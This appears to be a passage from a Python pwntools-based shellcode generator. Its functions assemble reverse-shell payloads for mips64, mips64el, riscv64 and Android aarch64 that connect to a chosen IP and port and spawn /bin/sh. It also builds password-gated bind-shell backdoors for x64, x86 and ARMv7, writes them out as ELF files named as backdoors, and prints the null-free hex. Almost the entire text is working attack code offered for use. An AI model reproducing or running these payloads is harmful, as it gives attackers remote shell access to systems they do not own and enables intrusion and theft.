	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	move $a0,$s0
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	'''
	shellcode_execve='''
	lui     $t1, 0x6e69
	ori     $t1, $t1, 0x622f
	sw      $t1, -8($sp)
	lui     $t9, 0xff97
	ori     $t9, $t9, 0x8cd0
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu   $sp, $sp, -8
	dadd     $a0, $sp, $zero
	lui     $t1, 0x6e69
	ori     $t1, $t1, 0x622f
	sw      $t1,-12($sp)
	lui     $t9, 0xff97
	ori     $t9, $t9, 0x8cd0
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	sw      $zero, -4($sp)
	daddiu   $sp, $sp, -12
	slti    $a1, $zero, -1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	li      $t9, -9
	nor     $a1, $t9, $zero
	dadd     $a1, $sp, $a1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	dadd     $a1, $sp, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13c1
	syscall 0x40404

	'''
	log.info("waiting 3s")
	sleep(3)
	shellcode=asm(shellcode_connect)+asm(shellcode_dup_sh)+asm(shellcode_execve)
	shellcode=make_elf(shellcode)
	if(filename==None):
		f=open("./mips64el_backdoor","wb")
		f.write(shellcode)
		f.close()
		log.success("mips64el_backdoor is ok in current path ./")
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"


def mips64_backdoor(reverse_ip,reverse_port,filename=None):
	context.arch='mips64'
	context.bits="64"
	context.endian='big'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_port = int(hex(reverse_port), 16)
	reverse_port = hex(0x10000 - int("0x" + enhex(p16(reverse_port)), 16) - 1)
	reverse_ip = list(reverse_ip.split("."))
	reverse_ip_high = hex(0x10000 - ((int(reverse_ip[0]) << 8) + int(reverse_ip[1])) - 1)
	# print(reverse_ip_high)
	# print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
	# print(reverse_ip_high)
	reverse_ip_low = hex(0x10000 - ((int(reverse_ip[2]) << 8) + int(reverse_ip[3])) - 1)
	shellcode_connect = '''
	li      $t9, -3
	nor     $a0, $t9, $zero
	li      $t9, -3
	nor     $a1, $t9, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13b0
	syscall 0x40404
	sw      $v0, -4($sp)
	lw      $s0, -4($sp)
	lui     $t9, 0xfffd
	ori     $t9, $t9, %s
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	lui     $t9, %s
	ori     $t9, $t9, %s
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu  $sp, $sp, -8
	sw      $s0, -4($sp)
	lw      $a0, -4($sp)
	move     $a1,$sp
	li      $t9, -17
	nor     $a2, $t9, $zero
	li      $v0, 0x13b1
	syscall 0x40404
	'''
	shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_high,reverse_ip_low)
	shellcode_dup_sh='''
	move $a0,$s0
	nor $a1,$zero,-1
	li  $v0,0x13A8
	syscall 0x40404
	move $a0,$s0
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	move $a0,$s0
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	'''
	shellcode_execve='''
	lui     $t1, 0x2f62
	ori     $t1, $t1, 0x696e
	sw      $t1, -8($sp)
	lui     $t9, 0xd08c
	ori     $t9, $t9, 0x97ff
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu   $sp, $sp, -8
	dadd     $a0, $sp, $zero
	lui     $t1, 0x2f62
	ori     $t1, $t1, 0x696e
	sw      $t1, -12($sp)
	lui     $t9, 0xd08c
	ori     $t9, $t9, 0x97ff
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	sw      $zero, -4($sp)
	daddiu   $sp, $sp, -12
	slti    $a1, $zero, -1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	li      $t9, -9
	nor     $a1, $t9, $zero
	dadd     $a1, $sp, $a1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	dadd     $a1, $sp, $zero
	slti    $a2, $zero, -1
	li      $v0,0x13c1
	syscall 0x40404
	'''
	shellcode = asm(shellcode_connect) + asm(shellcode_dup_sh) + asm(shellcode_execve)
	shellcode = make_elf(shellcode)
	log.info("waiting 3s")
	sleep(3)
	if (filename == None):
		f = open("./mips64_backdoor", "wb")
		f.write(shellcode)
		f.close()
		log.success("mips64_backdoor is ok in current path ./")
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"

def mips64el_reverse_sl(reverse_ip,reverse_port):
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_port=int(hex(reverse_port),16)
	reverse_port=hex(0x10000-int("0x"+enhex(p16(reverse_port)),16)-1)
	reverse_ip=list(reverse_ip.split("."))
	reverse_ip_high=hex(0x10000-((int(reverse_ip[1])<<8)+int(reverse_ip[0]))-1)
	#print(reverse_ip_high)
	#print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
	#print(reverse_ip_high)
	reverse_ip_low=hex(0x10000-((int(reverse_ip[3])<<8)+int(reverse_ip[2]))-1)
	#print(reverse_ip_low)
	context.arch='mips64'
	context.bits="64"
	context.endian='little'
	shellcode_connect='''
	li      $t9, -3
	nor     $a0, $t9, $zero
	li      $t9, -3
	nor     $a1, $t9, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13b0
	syscall 0x40404
	sw      $v0, -4($sp)
	lw      $s0, -4($sp)
	lui     $t9, %s
	ori     $t9, $t9, 0xfffd
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	lui     $t9, %s
	ori     $t9, $t9, %s
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu  $sp, $sp, -8
	sw      $s0, -4($sp)
	lw      $a0, -4($sp)
	move     $a1,$sp
	li      $t9, -17
	nor     $a2, $t9, $zero
	li      $v0, 0x13b1
	syscall 0x40404
	'''
	shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_low,reverse_ip_high)
	shellcode_dup_sh='''
	xor $t2,$t2
	move $a1,$t2
	li  $v0,0x13A8
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	'''
	shellcode_execve='''
	lui     $t1, 0x6e69
	ori     $t1, $t1, 0x622f
	sw      $t1, -8($sp)
	lui     $t9, 0xff97
	ori     $t9, $t9, 0x8cd0
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu   $sp, $sp, -8
	dadd     $a0, $sp, $zero
	lui     $t1, 0x6e69
	ori     $t1, $t1, 0x622f
	sw      $t1,-12($sp)
	lui     $t9, 0xff97
	ori     $t9, $t9, 0x8cd0
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	sw      $zero, -4($sp)
	daddiu   $sp, $sp, -12
	slti    $a1, $zero, -1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	li      $t9, -9
	nor     $a1, $t9, $zero
	dadd     $a1, $sp, $a1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	dadd     $a1, $sp, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13c1
	syscall 0x40404
	'''
	data_shellcode=asm(shellcode_connect)+asm(shellcode_dup_sh)+asm(shellcode_execve)
	shellcode_len = len(data_shellcode)
	shellcode_hex = ''
	shellcode_hex = extract_shellcode.extract_sl_print(data_shellcode, shellcode_hex)
	if "\\x00" in shellcode_hex:
		log.info("waiting 3s")
		sleep(3)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in {}".format(data_shellcode.index(b"\x00")))
		print(shellcode_hex)
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
		return data_shellcode
	else:
		log.info("waiting 3s")
		sleep(3)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
		return data_shellcode

def mips64_reverse_sl(reverse_ip,reverse_port):
	context.arch = 'mips64'
	context.bits = "64"
	context.endian = 'big'
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_port = int(hex(reverse_port), 16)
	reverse_port = hex(0x10000 - int("0x" + enhex(p16(reverse_port)), 16) - 1)
	reverse_ip = list(reverse_ip.split("."))
	reverse_ip_high = hex(0x10000 - ((int(reverse_ip[0]) << 8) + int(reverse_ip[1])) - 1)
	# print(reverse_ip_high)
	# print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
	# print(reverse_ip_high)
	reverse_ip_low = hex(0x10000 - ((int(reverse_ip[2]) << 8) + int(reverse_ip[3])) - 1)
	shellcode_connect = '''
		li      $t9, -3
		nor     $a0, $t9, $zero
		li      $t9, -3
		nor     $a1, $t9, $zero
		slti    $a2, $zero, -1
		li      $v0, 0x13b0
		syscall 0x40404
		sw      $v0, -4($sp)
		lw      $s0, -4($sp)
		lui     $t9, 0xfffd
		ori     $t9, $t9, %s
		nor     $t1, $t9, $zero
		sw      $t1, -8($sp)
		lui     $t9, %s
		ori     $t9, $t9, %s
		nor     $t1, $t9, $zero
		sw      $t1, -4($sp)
		daddiu  $sp, $sp, -8
		sw      $s0, -4($sp)
		lw      $a0, -4($sp)
		move     $a1,$sp
		li      $t9, -17
		nor     $a2, $t9, $zero
		li      $v0, 0x13b1
		syscall 0x40404
		'''
	shellcode_connect = shellcode_connect % (reverse_port, reverse_ip_high, reverse_ip_low)
	shellcode_dup_sh='''
	xor $t2,$t2
	move $a1,$t2
	li  $v0,0x13A8
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0x13A8
	syscall 0x40404
	'''
	shellcode_execve='''
	lui     $t1, 0x2f62
	ori     $t1, $t1, 0x696e
	sw      $t1, -8($sp)
	lui     $t9, 0xd08c
	ori     $t9, $t9, 0x97ff
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu   $sp, $sp, -8
	dadd     $a0, $sp, $zero
	lui     $t1, 0x2f62
	ori     $t1, $t1, 0x696e
	sw      $t1, -12($sp)
	lui     $t9, 0xd08c
	ori     $t9, $t9, 0x97ff
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	sw      $zero, -4($sp)
	daddiu   $sp, $sp, -12
	slti    $a1, $zero, -1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	li      $t9, -9
	nor     $a1, $t9, $zero
	dadd     $a1, $sp, $a1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	dadd     $a1, $sp, $zero
	slti    $a2, $zero, -1
	li      $v0,0x13c1
	syscall 0x40404
	'''
	data_shellcode=asm(shellcode_connect)+asm(shellcode_dup_sh)+asm(shellcode_execve)
	shellcode_len = len(data_shellcode)
	shellcode_hex = ''
	shellcode_hex = extract_shellcode.extract_sl_print(data_shellcode, shellcode_hex)
	if "\\x00" in shellcode_hex:
		log.info("waiting 3s")
		sleep(3)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in {}".format(data_shellcode.index(b"\x00")))
		print(shellcode_hex)
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
		return data_shellcode
	else:
		log.info("waiting 3s")
		sleep(3)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
		return data_shellcode
		
def riscv64el_backdoor(reverse_ip,reverse_port,filename=None):
	'''
	socket 0xc6
	connect 0xcb
	dup2 0x18
	'''
	context.arch='riscv'
	context.bits="64"
	context.endian="little"
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_ip=reverse_ip.split(".")[::-1]
	reverse_ip_new='0x'
	for i in  range(4):
		reverse_ip_new+=enhex(p8(int(reverse_ip[i])))
	reverse_port=enhex(p16(reverse_port))+"0002"
	all_reverse_infor=reverse_ip_new+reverse_port
	shellcode_connect='''
	li a0,2
	li a1,1
	li a2,0
	li a7,0xc6
	ecall
	mv a6,a0
	li s1,%s
	sd s1,-16(sp)
	add a1,sp,-16
	li a2,16
	li a7,0xcb
	ecall
	'''
	shellcode_connect=shellcode_connect%(all_reverse_infor)
	shellcode_connect=asm(shellcode_connect)
	shellcode_dup_sh='''
	mv a0,a6
	li a1,0
	li a2,0
	li a7,0x18
	ecall
	mv a0,a6
	add a1,a1,1
	ecall
	mv a0,a6
	add a1,a1,1
	ecall
	'''
	shellcode_dup_sh=asm(shellcode_dup_sh)
	shellcode_execve='''
	li s1, 0x68732f2f6e69622f
	sd s1, -16(sp)
	sd zero, -8(sp)
	addi a0,sp,-16
	sd a0, -32(sp)
	addi a1,sp,-32
	slt a2,zero,-1 
	li a7, 221
	ecall
	'''
	shellcode_execve=asm(shellcode_execve)
	shellcode = shellcode_connect+shellcode_dup_sh+shellcode_execve
	shellcode=make_elf(shellcode)
	log.info("waiting 3s")
	sleep(3)
	if(filename==None):
		f=open("./riscv64el_backdoor","wb")
		f.write(shellcode)
		f.close()
		log.success("riscv64el_backdoor is ok in current path ./")
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"

def android_aarch64_backdoor(reverse_ip,reverse_port,filename=None):
	context.arch='aarch64'
	context.endian='little'
	context.bits="64"
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode2='''
	mov x0,x12
	mov x1,#0
	mov x2,#0
	mov x8,#0x18
	svc #0x1337
	mov x0,x12
	mov x1,#1
	svc #1337
	mov x0,x12
	mov x1,#2
	svc #1337
	'''
	shellcode2=asm(shellcode2)
	shellcode3=asm(shellcraft.execve("/system/bin/sh",0,0))
	all_reverseshell=basic_shellcode+shellcode2+shellcode3
	#all_reverseshell=shellcode3
	data=make_elf(all_reverseshell)
	log.info("waiting 3s")
	sleep(3)
	if filename==None:
		filename="backdoor_Android_aarch64"
		f=open(filename,"wb")
		f.write(data)
		f.close()
		#print disasm(all_reverseshell)
		log.success("backdoor_Android_aarch64 is ok in current path ./")
		context.arch='i386'
		context.bits="32"
		context.endian="little"


'''
2022.10.20
Add bind shellcode and backdoor module ,Plan to complete all architectures within 3 weeks
'''

'''
x64 bindshell backdoor
'''



def x64_bind_shell(listen_port, passwd, filename=None):
	context.arch = 'amd64'
	context.endian = 'little'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd)
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	#passwd = '0x'+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd = "0x"+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	shellcode = '''
	push   0x29
	pop    rax
	push   0x2
	pop    rdi
	push   0x1
	pop    rsi
	xor    rdx,rdx
	syscall 
	push   rax
	pop    rdi
	push   rdx
	push   rdx
	pushw  %s
	pushw  0x2
	push   0x31
	pop    rax
	push   rsp
	pop    rsi
	mov    dl,0x10
	syscall
	push  0x32
	pop    rax
	push   0x2
	pop    rsi
	syscall 
 	push   0x2b
 	pop    rax
	xor    rsi,rsi
	cdq    
	syscall 
	push   rax
	pop    rdi
	push   0x2
	pop    rsi
	push   0x21
	pop    rax
	syscall
	push   rax
	pop    rdi
	push   0x2
	pop    rsi
	push   0x21
	pop    rax
	syscall
	dec    rsi
	jns    $-8
	push   0x1
	pop    rax
	movabs r9,0x203a647773736150
	push   r9
	mov    rsi,rsp
	push   0x8
	pop    rdx
	syscall
	mov    rdx, %s
	xor    rax,rax
	add    rsi,0x8
	syscall 
	movabs rax,%s
	push   rsi
	pop    rdi
	scas   rax,QWORD PTR es:[rdi]
	jne    $+0x1e
	xor    rax,rax
	push   rax
	movabs rbx,0x68732f2f6e69622f
	push   rbx
	push   rsp
	pop    rdi
	push   rax
	push   rsp
	pop    rdx
	push   rdi
	push   rsp
	pop    rsi
	push   0x3b
	pop    rax
	syscall 
	'''
	shellcode = asm(shellcode%(listen_port, passwd_len, passwd))
	data=make_elf(shellcode)
	log.info("waiting 3s")
	sleep(3)
	if(filename==None):
		f=open("./x64_bind_shell","wb")
		f.write(data)
		f.close()
		log.success("x64_bind_shell is ok in current path ./")
	context.arch = 'i386'
	context.bits = "32"
	context.endian = "little"



'''
x86 bindshell backdoor

Completion time 2022.10.26 12:07
'''

def x86_bind_shell(listen_port, passwd, filename=None):
	context.arch = 'i386'
	context.endian = 'little'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	print(passwd)
	shellcode = '''
	push 0x1
	pop ebx
	xor edx,edx
	push edx
	push 0x66
	pop eax
	push ebx
	push 0x2
	mov ecx,esp
	int 0x80
	mov esi,eax
	push 0x66
	pop eax
	mov ebx,0x2
	push dx
	push %s
	push bx
	mov ecx,esp
	push 0x10
	push ecx
	push esi
	mov ecx,esp
	int 0x80
	push 0x66
	pop eax
	mov bl,4
	push 0
	push esi
	mov ecx,esp
	int 0x80
	push 0x66
	pop eax
	inc ebx
	push edx
	push edx
	push esi
	mov ecx,esp
	int 0x80
	mov ebx,eax
	xor ecx,ecx
	mov cl,2
	mov al,0x3f
	int 0x80
	dec ecx
	jns $-5
	push 0x003a6477
	push 0x73736150
	mov  ecx,esp
	push 4
	pop  eax
	push 8
	pop  edx
	int 0x80
	push 3
	pop eax
	xor ecx,ecx
	sub esp,8
	mov ecx,esp
	push %s
	pop edx
	int 0x80
	mov edi,[esp]
	cmp edi,%s
	jne $+80
	push 0x68
	push 0x732f2f2f
	push 0x6e69622f
	mov ebx, esp
	/* push argument array ['sh\x00'] */
	/* push 'sh\x00\x00' */
	push 0x1010101
	xor dword ptr [esp], 0x1016972
	xor ecx, ecx
	push ecx /* null terminate */
	push 4
	pop ecx
	add ecx, esp
	push ecx /* 'sh\x00' */
	mov ecx, esp
	xor edx, edx
	/* call execve() */
	push SYS_execve /* 0xb */
	pop eax
	int 0x80
	'''
	shellcode = asm(shellcode%(listen_port, passwd_len, passwd))
	data = make_elf(shellcode)
	log.info("waiting 3s")
	sleep(3)
	if(filename==None):
		f=open("./x86_bind_shell","wb")
		f.write(data)
		f.close()
		log.success("x86_bind_shell is ok in current path ./")
	context.arch = 'i386'
	context.bits = "32"
	context.endian = "little"


'''
Armv7 bindshell backdoor file

2022.10.26 updating more appear
'''
def armelv7_bind_shell(listen_port, passwd, filename=None):
	context.arch = 'arm'
	context.endian = 'little'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(8,"0")
	#print(passwd)
	passwd_high = passwd[:6]
	passwd_low  = "0x"+passwd[6:10]
	shellcode = shellcraft.socket(2,1,0)
	shellcode += '''
	mov  r6, r0
	movw r7, #2
	movt r7, #%s
	push {r2}
	push {r7}
	mov  r1,sp
	mov  r2,#0x10  
	movw r7, 0x11a
	svc #0
	mov r0,r6
	eor r1,r1
	movw r7,#284
	svc #0
	mov r0,r6
	eor r2,r2
	movw r7, 0x11d
    svc #0
    mov r6,r0
	movw r7, #0x41414100 & 0xffff
	movt r7, #0x41414100 >> 16
	push {r7}
	movw r7, #0x203a6477 & 0xffff
	movt r7, #0x203a6477 >> 16
	push {r7}
	movw r7, #0x73736150 & 0xffff
	movt r7, #0x73736150 >> 16
	push {r7}
	mov  r1, sp
	mov  r0, r6
	mov  r2, #8
	/* call write() */
	mov  r7, #SYS_write /* 4 */
	svc  #0
	sub  sp, 0x20
	mov  r0, r6
	mov  r1, sp
	mov  r2, #%s
	mov  r7, #3
	svc  #0
	mov  r7,sp
	ldr  r7,[r7]
	movw r5,#%s
	movt r5,#%s
	cmp  r7,r5
	'''
	shellcode = asm(shellcode % (listen_port, passwd_len ,passwd_low ,passwd_high))
	shellcode += b"\x80\x00\x00\x1a"
	shellcode_dump = '''
	mov r1,#2
	mov r0,r6
	mov r7,#63
	svc #0
	sub r1, r1, #1
	cmp r1,#0
	'''
	shellcode += asm(shellcode_dump) + b"\xF9\xFF\xFF\xaa"
	shellcode += asm(shellcraft.sh())
	data = make_elf(shellcode)
	log.info("waiting 3s")
	sleep(3)
	if(filename==None):
		f=open("./armelv7_bind_shell","wb")
		f.write(data)
		f.close()
		log.success("armelv7_bind_shell is ok in current path ./")
	context.arch = 'i386'
	context.bits = "32"
	context.endian = "little"



